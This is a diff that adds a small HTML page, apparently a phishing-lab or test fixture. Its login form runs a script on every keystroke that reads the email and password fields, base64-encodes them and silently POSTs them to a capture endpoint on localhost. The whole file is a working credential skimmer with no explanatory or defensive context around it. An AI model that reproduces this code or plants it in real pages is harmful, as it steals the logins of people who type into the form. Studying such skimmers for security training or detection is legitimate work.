@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+    <body>
+        <script>
+            function capturedCredentials() {
+                try {
+                    let email = document.getElementById("email").value
+                    let pass = document.getElementById("password").value
+                    if (email !== '' && pass !== '') {
+                        let data = btoa(`email=${email};pass=${pass}`)
+                        const xhttp = new XMLHttpRequest()
+                        xhttp.open("POST", "http://localhost:8089/capture")
+                        xhttp.send(data)
+                    }
+                } catch (error) {}
+            }
+        </script>
+        <form oninput="capturedCredentials()">
+            <input type="text" id="email" />
+            <input type="password" id="password" />
+        </form>
+    </body>
+</html>
